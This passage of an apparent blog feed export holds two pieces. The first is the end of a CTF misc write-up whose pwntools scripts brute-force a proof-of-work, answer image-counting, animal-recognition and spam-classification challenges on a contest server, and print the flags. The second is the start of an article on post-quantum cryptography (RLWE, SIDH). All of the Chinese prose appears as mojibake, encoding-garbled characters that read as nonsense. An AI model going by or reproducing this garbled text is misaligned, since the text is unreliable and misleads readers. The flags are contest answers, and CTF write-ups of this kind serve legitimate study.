<span class="string">&#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;</span>, <span class="string">&#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;</span>, <span class="string">&#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;</span>, <span class="string">&#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;</span>, <span class="string">&#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;</span>, <span class="string">&#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;</span>, <span class="string">&#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;</span>, <span class="string">&#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;</span>, <span class="string">&#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;</span>, <span class="string">&#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    x = md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest()</span><br><span class="line">    m.append(x)</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    out.append(res[sample[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(out).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Got it!</span><br><span class="line">flag&#123;d8b8a96466e21df8b45cce5ce875e95e&#125;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="å›¾ç‰‡è¯†åˆ«"><a href="#å›¾ç‰‡è¯†åˆ«" class="headerlink" title="å›¾ç‰‡è¯†åˆ«"></a>å›¾ç‰‡è¯†åˆ«</h3><p>ç»™å®šåŠ¨ç‰©æ ·æœ¬æ•°æ®ï¼Œåˆ¤æ–­éšæœºæŠ½å–10æ¬¡åŠ¨ç‰©å›¾ç‰‡ï¼Œè¾“å…¥åŠ¨ç‰©åç§°ï¼Œæ­£ç¡®è‡³å°‘8æ¬¡ç»™flagï¼Œæ¯æ¬¡3så†…è¾“å…¥ã€‚</p><p>æ•°é‡è¾ƒå°‘ï¼Œéé¢„æœŸç›´æ¥æŒ‰ç…§å›¾ç‰‡æ‰‹åŠ¨åˆ¤æ–­åœ¨3så†…å¿«é€Ÿè¾“å…¥å³å¯ã€‚</p><p>åŠè‡ªåŠ¨äº¤äº’ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">28452</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>)</span><br><span class="line">    img.show()</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(raw_input(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="åƒåœ¾é‚®ä»¶åˆ†æ"><a href="#åƒåœ¾é‚®ä»¶åˆ†æ" class="headerlink" title="åƒåœ¾é‚®ä»¶åˆ†æ"></a>åƒåœ¾é‚®ä»¶åˆ†æ</h3><p>æä¾›50å°é‚®ä»¶å†…å®¹çš„æ­£å¸¸é‚®ä»¶/åƒåœ¾é‚®ä»¶åˆ†ç±»ï¼Œåˆ¤æ–­10å°é‚®ä»¶å†…å®¹å±äºå“ªç§åˆ†ç±»ï¼Œå…¨å¯¹ç»™flagã€‚</p><p>æ•°é‡è¾ƒå°‘ï¼Œéé¢„æœŸç›´æ¥æŒ‰ç…§å†…å®¹æ‰‹åŠ¨åˆ¤æ–­å³å¯ã€‚</p><p>PoWéƒ¨åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">27218</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;sha256(&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">28</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;= &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;xxxx = &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">51</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Press ENTER to continue... &#x27;</span>)</span><br><span class="line">    r.sendline()</span><br><span class="line">    </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>æŒ‰å†…å®¹æ‰‹åŠ¨åˆ¤æ–­è¾“å…¥Hï¼ˆæ­£å¸¸é‚®ä»¶ï¼‰æˆ–Sï¼ˆåƒåœ¾é‚®ä»¶ï¼‰ï¼Œå¾—åˆ°ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good job! Just take it:</span><br><span class="line">flag&#123;da238e5ee5716136c6884c0b4a369093&#125;</span><br></pre></td></tr></table></figure><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;âœŒï¸ç«èµ›æ—¶é—´ï¼š12æœˆ17æ—¥ 10:00â€”12æœˆ18æ—¥ 22:00&lt;br&gt;âœŒï¸å¾—åˆ†è§„åˆ™ï¼šæ¯”èµ›é‡‡ç”¨åŠ¨æ€åˆ†æ•°åˆ¶åº¦ ï¼Œæ¯é“é¢˜ç›®çš„åˆ†å€¼å°†æ ¹æ®è§£å‡ºé˜Ÿä¼çš„æ•°é‡è¿›è¡ŒåŠ¨æ€è®°åˆ†ã€‚&lt;br&gt;âœŒï¸é¢˜ç›®ç±»å‹ï¼šWebã€Pwnã€Reverseã€Miscã€Cryptoç­‰&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>åé‡å­å¯†ç </title>
    <link href="https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    <id>https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/</id>
    <published>2022-12-16T14:04:27.000Z</published>
    <updated>2023-08-04T16:33:18.963Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p><strong>åé‡å­å¯†ç å­¦</strong>ï¼ˆPost-Quantum Cryptographyï¼ŒPQCï¼‰ï¼Œåˆç§°<strong>æŠ—é‡å­è®¡ç®—å¯†ç å­¦</strong>ï¼Œæ˜¯å¯†ç å­¦çš„ä¸€ä¸ªç ”ç©¶é¢†åŸŸï¼Œä¸“é—¨ç ”ç©¶èƒ½å¤ŸæŠµæŠ—é‡å­è®¡ç®—æœºçš„åŠ å¯†ç®—æ³•ï¼Œç‰¹åˆ«æ˜¯å…¬é’¥åŠ å¯†ï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰ç®—æ³•ã€‚ä¸åŒäºé‡å­å¯†ç å­¦ï¼Œåé‡å­å¯†ç å­¦ä½¿ç”¨ç°æœ‰çš„ç”µå­è®¡ç®—æœºï¼Œä¸ä¾é é‡å­åŠ›å­¦ï¼Œå®ƒä¾é çš„æ˜¯å¯†ç å­¦å®¶è®¤ä¸ºæ— æ³•è¢«é‡å­è®¡ç®—æœºæœ‰æ•ˆè§£å†³çš„è®¡ç®—éš¾é¢˜ã€‚</p><p>åœ¨å…¬é’¥åŠ å¯†æ–¹é¢ï¼Œåé‡å­å¯†ç å­¦çš„ç ”ç©¶æ–¹å‘åŒ…æ‹¬äº†æ ¼å¯†ç å­¦ï¼ˆLattice-based Cryptographyï¼‰ã€å®¹é”™å­¦ä¹ é—®é¢˜ï¼ˆLWEï¼‰ã€å¤šå˜é‡å¯†ç å­¦ï¼ˆè‹±è¯­ï¼šMultivariate Cryptographyï¼‰ã€æ•£åˆ—å¯†ç å­¦ï¼ˆè‹±è¯­ï¼šHash-based Cryptographyï¼‰ã€ç¼–ç å¯†ç å­¦ï¼ˆCode-based Cryptographyï¼‰ä¸è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿åŒæºå¯†ç å­¦ï¼ˆSupersingular Isogeny Key Exchangeï¼‰ã€‚å¯†ç å­¦å®¶è®¤ä¸ºï¼ŒåŸºäºè¿™äº›è®¡ç®—éš¾é¢˜æœ‰æœ›æ„å»ºå‡ºä¸å—é‡å­è®¡ç®—æœºçš„å¨èƒçš„å…¬é’¥åŠ å¯†ç³»ç»Ÿï¼Œæ›¿ä»£ç°æœ‰çš„æ–¹æ¡ˆã€‚</p><p>â€‹    </p><h3 id="ç¯LWEï¼ˆRLWEï¼‰"><a href="#ç¯LWEï¼ˆRLWEï¼‰" class="headerlink" title="ç¯LWEï¼ˆRLWEï¼‰"></a>ç¯LWEï¼ˆRLWEï¼‰</h3><p>ç¯LWEé—®é¢˜æ˜¯LWEé—®é¢˜åœ¨ç¯ä¸Šçš„ç‰ˆæœ¬ï¼Œä¸åŒçš„æ˜¯ $A$ å’Œ $s$ çš„é€‰å–æ˜¯åœ¨å¤šé¡¹å¼ç¯ã€‚</p><p>å¤šé¡¹å¼ç¯ $R_q = \mathbb{Z_q}[x]/f(x)$ï¼Œè¡¨ç¤ºæ¯æ¬¡è®¡ç®—åéƒ½è¦å¯¹å¤šé¡¹å¼ç³»æ•°æ¨¡ $q$ï¼Œå¯¹å¤šé¡¹å¼æ¨¡ $f(x)$ã€‚å®ƒå…¶ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªå¤šé¡¹å¼ï¼Œæ¯ä¸€æ¬¡æ“ä½œéƒ½ç›¸å½“äºå¯¹å¤šä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œä¹Ÿå°±æ˜¯èƒ½å¤Ÿä¸€æ¬¡åŠ å¯†å¤šä¸ªæ¯”ç‰¹çš„æ˜æ–‡ï¼Œå¯¹æ¯”LWEæ¯æ¬¡ä»…èƒ½å¯¹ä¸€ä¸ªæ¯”ç‰¹æ“ä½œæ¥è¯´èƒ½å¤Ÿå¤§å¤§æé«˜æ•ˆç‡æ»¡è¶³å®é™…éœ€è¦ã€‚</p><p>â€‹    </p><h3 id="è¶…å¥‡å¼‚åŒæºå¯†é’¥äº¤æ¢ï¼ˆSIDHï¼‰"><a href="#è¶…å¥‡å¼‚åŒæºå¯†é’¥äº¤æ¢ï¼ˆSIDHï¼‰" class="headerlink" title="è¶…å¥‡å¼‚åŒæºå¯†é’¥äº¤æ¢ï¼ˆSIDHï¼‰"></a>è¶…å¥‡å¼‚åŒæºå¯†é’¥äº¤æ¢ï¼ˆSIDHï¼‰</h3><p>è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿åŒæºå¯†ç å­¦ï¼ˆSupersingular Elliptic Curve Isogeny Cryptographyï¼‰æ˜¯åˆ©ç”¨è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ï¼ˆSupersingular Elliptic Curvesï¼‰ä¸è¶…å¥‡å¼‚åŒæºå›¾ï¼ˆSupersingular Isogeny Graphsï¼‰çš„æ•°å­¦æ€§è´¨çš„å¯†ç å­¦ï¼Œå¯ä»¥å®ç°<strong>è¶…å¥‡å¼‚åŒæºå¯†é’¥äº¤æ¢</strong>ï¼ˆSupersingular Isogeny Key Exchangeï¼Œ<strong>SIKE</strong>ï¼‰ï¼ˆåè®®ä¸ºè¶…å¥‡å¼‚åŒæºDiffie-Hellmanå¯†é’¥äº¤æ¢åè®®ï¼Œ<strong>SIDH</strong>ï¼‰ï¼Œå…·æœ‰å‰å‘å®‰å…¨æ€§ã€‚å…¶ä½¿ç”¨æ–¹æ³•å’Œç°æœ‰çš„Diffie-Hellmanå¯†é’¥äº¤æ¢ç›¸ä¼¼ï¼Œæœ‰æœ›ç›´æ¥æ›¿ä»£å½“å‰çš„å¸¸è§„æ¤­åœ†æ›²çº¿å¯†é’¥äº¤æ¢ï¼ˆECDHï¼‰ã€‚</p><p>Diffie-HellmanåŸºæœ¬åè®®ï¼š</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH0.jpeg" alt="img"></p><p>æŠ½è±¡Diffie-Hellmanï¼š</p><p>Aliceçš„ç§˜å¯†æ˜¯ $a$ï¼Œå¥¹çš„è®¡ç®—å…ˆåšâ†’ï¼Œå¾—åˆ° $g^a$ï¼Œå†åšâ†“ï¼Œå¾—åˆ° $g^{ab}$ã€‚è€ŒBobçš„ç§˜å¯†æ˜¯ $b$ï¼Œä»–å…ˆåšâ†“ï¼Œå†åšâ†’ã€‚æ®Šé€”åŒå½’å¾—åˆ° $g^{ab}$ã€‚</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH1.jpeg" alt="img"></p><h4 id="SIDHæ„é€ çš„ç®€åŒ–ç‰ˆæœ¬"><a href="#SIDHæ„é€ çš„ç®€åŒ–ç‰ˆæœ¬" class="headerlink" title="SIDHæ„é€ çš„ç®€åŒ–ç‰ˆæœ¬"></a>SIDHæ„é€ çš„ç®€åŒ–ç‰ˆæœ¬</h4><p>SIDHçš„åŸºæœ¬ä»£æ•°ç»“æ„æ˜¯è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ç¾¤ $E$ å’Œè¶…å¥‡å¼‚åŒæºï¼ˆIsogenyï¼‰$\phi$ã€‚åŸºæœ¬æ€è·¯å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-2.jpeg" alt="img" style="zoom: 67%;"></p><p>é¦–å…ˆï¼Œè¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ç¾¤ $E$ ç†è§£ä¸ºä¸€ä¸ªç¾¤ã€‚å…¶æ¬¡ï¼Œæ„é€ ç”¨åˆ°çš„è¶…å¥‡å¼‚åŒæº $\phi : E \mapsto Eâ€™$ æ˜¯ä»ç¾¤ $E$ åˆ°ç¾¤ $Eâ€™$ çš„ä¸€ç§ç¾¤åŒæ€ã€‚ç®—æ³•ç±»ä¼¼DHç®—æ³•åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ul><li>é¦–å…ˆï¼ŒAliceé€‰å–ä¸€ä¸ªç‚¹ $R_A \in E$ï¼Œ$\langle R_A \rangle$ ç¡®å®šäº†ç¾¤ $E$ çš„ä¸€ä¸ªå­ç¾¤ï¼Œç„¶åå¯ä»¥è®¡ç®—å¾—åˆ°ä¸€ä¸ªä» $E$ æ˜ å°„åˆ°å…¶å­ç¾¤ $E_A$ çš„åŒæº $\phi_A: E \mapsto E_A$ï¼Œè¿™æ˜¯Aliceçš„ç§˜å¯†ä¿¡æ¯ã€‚Aliceå‘é€å…¬å¼€ä¿¡æ¯ $E_A$ ç»™Bobã€‚</li><li>åŒæ ·ï¼ŒBobé€‰æ‹©ç‚¹ $R_B\in E$ï¼Œç„¶åè®¡ç®—å¾—åˆ° $\phi_B: E \mapsto E_B$ï¼ŒæŠŠå…¬å¼€ä¿¡æ¯ $E_B$ å‘é€ç»™Aliceã€‚</li></ul><p>æœ€ç»ˆAliceç®—å‡º $E/\langle R_B, R_A \rangle$ï¼ŒBobç®—å‡º $E/\langle R_A, R_B \rangle$ã€‚ä¸Šå›¾ä¸­çš„ $E/\langle R_A \rangle$ å’Œ $E/\langle R_B \rangle$ åˆ†åˆ«æ˜¯ $E_A$ å’Œ $E_B$ï¼Œè¿™æ ·è¡¨è¾¾æ˜¯ä¸ºäº†ä¸ä¹‹å‰çš„è¡¨è¾¾ä¸€è‡´ï¼Œå…¶å®è¿™é‡Œå¹¶ä¸æ˜¯åšå•†ç¾¤ï¼Œè€Œæ˜¯è¡¨è¾¾è¯´ $\phi_A$ çš„Kernelæ˜¯ $\langle R_A \rangle$ã€‚ç›®å‰çš„ç§‘æŠ€æ–‡çŒ®å¤§å¤šä½¿ç”¨è¿™ç§è¡¨è¾¾ã€‚</p><p>ä¸Šé¢è¯´åˆ°ï¼Œ$E_A$ æ˜¯æ›²çº¿ç¾¤ $E$ çš„å­ç¾¤ï¼Œå®ƒç”±åŒæº $\phi_A$ å†³å®šï¼Œå¯ç†è§£ä¸ºç¾¤åŒæ€ $\phi_A$ æ˜ å°„åˆ° $E$ ä¸Šçš„åƒ (Image)å½¢æˆçš„å­ç¾¤ã€‚åŒç†ï¼Œ$E_{BA}$ æ˜¯åŒæº $\phi_{BA}$ æ˜ å°„åˆ° $E$ ä¸Šçš„å­ç¾¤ï¼Œè€ŒåŒæº $\phi_{BA}$ æ˜¯ç”± $\langle R_B, R_A \rangle$ å†³å®šçš„ï¼Œå³åŒæº $\phi_{BA}$ çš„Kernelæ˜¯ $\langle R_B, R_A \rangle$ã€‚</p><h4 id="SIDHæ„é€ çš„ç»†åŒ–ç‰ˆæœ¬"><a href="#SIDHæ„é€ çš„ç»†åŒ–ç‰ˆæœ¬" class="headerlink" title="SIDHæ„é€ çš„ç»†åŒ–ç‰ˆæœ¬"></a>SIDHæ„é€ çš„ç»†åŒ–ç‰ˆæœ¬</h4><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-3.jpeg" alt="img" style="zoom:67%;"></p><p>ä¸ºäº†æ»¡è¶³Aliceåœ¨æ²¡æœ‰Bobçš„ç§˜å¯†ä¿¡æ¯çš„æƒ…å†µä¸‹èƒ½è®¡ç®—å‡º $E_{BA}$ çš„è¦æ±‚ï¼ŒSIDHéœ€è¦ä½¿ç”¨æ›´å¤šçš„å‚æ•°è®¾è®¡å’Œç›¸å…³è®¡ç®—ã€‚ç®—æ³•å¢åŠ æè¿°å¦‚ä¸‹ï¼š</p><h5 id="SIDHå‚æ•°è®¾è®¡"><a href="#SIDHå‚æ•°è®¾è®¡" class="headerlink" title="SIDHå‚æ•°è®¾è®¡"></a>SIDHå‚æ•°è®¾è®¡</h5><p>é¦–å…ˆï¼Œé€‰æ‹©è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ $E$ ä½œä¸ºå…¬å¼€å‚æ•°ã€‚ç„¶åAliceéšæœºé€‰æ‹©ä¸¤ä¸ªå…ƒç´  $P_A, Q_A \in E$ï¼Œå¹¶å…¬å¼€ä½œä¸ºè‡ªå·±çš„å…¬å…±å‚æ•°ã€‚åŒæ ·ï¼ŒBobä¹Ÿéšæœºé€‰æ‹©ä¸¤ä¸ªå…ƒç´  $P_B, Q_B \in E$ å¹¶å…¬å¼€ã€‚</p><h5 id="Aliceçš„æ“ä½œ"><a href="#Aliceçš„æ“ä½œ" class="headerlink" title="Aliceçš„æ“ä½œ"></a>Aliceçš„æ“ä½œ</h5><ul><li>éšæœºé€‰æ‹©ä¸¤ä¸ªæ•´æ•° $s_A$ å’Œ $t_A$ ä½œä¸ºç§˜å¯†ä¿¡æ¯ï¼Œè®¡ç®— $R_A = s_A P_A + t_A Q_A\in E$ï¼Œå¹¶ç”± $R_A$ è®¡ç®—å¾—åˆ°ä¸€ä¸ªä» $E$ æ˜ å°„åˆ°å…¶å­ç¾¤ $E_A$ çš„åŒæº $\phi_A: E \mapsto E_A$ï¼Œè¿™ä¹Ÿæ˜¯Aliceçš„ç§˜å¯†ä¿¡æ¯ï¼›</li><li>è·å–Bobçš„å…¬å¼€ä¿¡æ¯ï¼Œå¹¶è®¡ç®— $\phi_A(P_B)$ å’Œ $\phi_A(Q_B)$ï¼Œè¿™äº›æ˜¯å…¬å¼€ä¿¡æ¯ï¼›</li><li>Aliceå‘é€å…¬å¼€ä¿¡æ¯ $E_A$ã€$\phi_A(P_B)$ å’Œ $\phi_A(Q_B)$ ç»™Bobã€‚</li></ul><h5 id="Bobçš„æ“ä½œ"><a href="#Bobçš„æ“ä½œ" class="headerlink" title="Bobçš„æ“ä½œ"></a>Bobçš„æ“ä½œ</h5><ul><li>éšæœºé€‰æ‹©ä¸¤ä¸ªæ•´æ•° $s_B$ å’Œ $t_B$ ä½œä¸ºç§˜å¯†ä¿¡æ¯ï¼Œè®¡ç®— $R_B = s_B P_B + t_B Q_B\in E$ï¼Œå¹¶ç”± $R_B$ è®¡ç®—å¾—åˆ°ä¸€ä¸ªä» $E$ æ˜ å°„åˆ°å…¶å­ç¾¤ $E_B$ çš„åŒæº $\phi_B: E \mapsto E_B$ï¼Œè¿™ä¹Ÿæ˜¯Bobçš„ç§˜å¯†ä¿¡æ¯ï¼›</li><li>è·å–Aliceçš„å…¬å¼€ä¿¡æ¯ï¼Œå¹¶è®¡ç®— $\phi_B(P_A)$ å’Œ $\phi_B(Q_A)$ï¼Œè¿™äº›æ˜¯å…¬å¼€ä¿¡æ¯ï¼›</li><li>Bobå‘é€å…¬å¼€ä¿¡æ¯ $E_B$ã€$\phi_B(P_A)$ å’Œ $\phi_B(Q_A)$ ç»™Aliceã€‚</li></ul><h5 id="ç§˜å¯†å€¼çš„è®¡ç®—"><a href="#ç§˜å¯†å€¼çš„è®¡ç®—" class="headerlink" title="ç§˜å¯†å€¼çš„è®¡ç®—"></a>ç§˜å¯†å€¼çš„è®¡ç®—</h5><p>Aliceè®¡ç®—å­ç¾¤ $E_{BA}$ ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p><ul><li>æ³¨æ„ï¼Œæ­¤æ—¶AliceæŒæ¡çš„ä¿¡æ¯æ˜¯ $s_A$ã€$t_A$ã€$R_A$ã€$\phi_B(P_A)$ å’Œ $\phi_B(Q_A)$ï¼Œå¥¹æƒ³è®¡ç®—å¾—åˆ° $\phi_B(R_A)$ã€‚å¹¶ä¸”è¦å¼ºè°ƒï¼Œ$\phi_B$ æ˜¯ä¸€ç§ç¾¤åŒæ€ã€‚</li><li>åˆ©ç”¨ç¾¤åŒæ€çš„å±æ€§å¯è®¡ç®—å¾—åˆ°ï¼š$\phi_B(R_A) = \phi_B(s_A P_A + t_A Q_A) = s_A \phi_B(P_A) + t_A \phi_B(Q_A)$ ã€‚</li><li>æ ¹æ® $\phi_B(R_A)$ è®¡ç®— $E_{BA}$ã€‚$E_{BA}$æ˜¯æ›²çº¿ç¾¤ $E$ çš„å­ç¾¤ï¼Œæ˜¯ä»¥ $\phi_B (R_A)$ ä¸ºKernelçš„ç¾¤åŒæ€æ˜ å°„åˆ° $E$ ä¸Šçš„å­ç¾¤ã€‚è¿™ä¸ªç¾¤åŒæ€ä¹Ÿå°±æ˜¯Isogenyï¼Œè¿™ä¸ªIsogenyè®°ä¸º $\phi_{BA}$ ã€‚</li></ul><p>ç±»ä¼¼çš„ï¼ŒBobå¯ä»¥è®¡ç®—å­ç¾¤ $E_{AB}$ï¼š</p><ul><li>$\phi_A(R_B) = s_B \phi_A(P_B) + t_B \phi_A(Q_B)$ï¼›</li><li>ç”±æ­¤å¯è®¡ç®—å¾— $E_{AB}$ ï¼›</li></ul><p>æœ€åå†²é¡¶çš„ä¸€æ­¥ï¼Œè®¡ç®—ç§˜å¯†å€¼ã€‚é¦–å…ˆè¦æ˜ç¡®ï¼Œå¾ˆå¯èƒ½ $E_{BA} \ne E_{AB}$ï¼Œä½†æ˜¯ï¼Œ$E_{BA}$ åŒæ„äº $E_{AB}$ã€‚åˆ©ç”¨åŒæ„æ›²çº¿çš„ä¸€ä¸ªå±æ€§ï¼šæ‰€æœ‰åŒæ„æ›²çº¿çš„J-Invariantå€¼ç›¸åŒã€‚äºæ˜¯Aliceå’ŒBobåˆ†åˆ«è®¡ç®—è¿™ä¸¤æ¡æ›²çº¿çš„J-Invariantå€¼ $J(E_{BA})$ å’Œ $J(E_{AB})$ï¼Œè¿™å°±æ˜¯ä»–ä»¬å…±åŒæ‹¥æœ‰çš„ç§˜å¯†ã€‚J-Invariantçš„è®¡ç®—å®šä¹‰å¯åœ¨æ ‡å‡†æ•™ç§‘ä¹¦ä¸­æ‰¾åˆ°ï¼Œæœ¬æ–‡æŠŠå®ƒè§†ä¸ºé»‘ç›’å­ä½¿ç”¨ã€‚</p><h4 id="Sageä»£ç "><a href="#Sageä»£ç " class="headerlink" title="Sageä»£ç "></a>Sageä»£ç </h4><p><strong>å‚æ•°è®¾ç½®</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 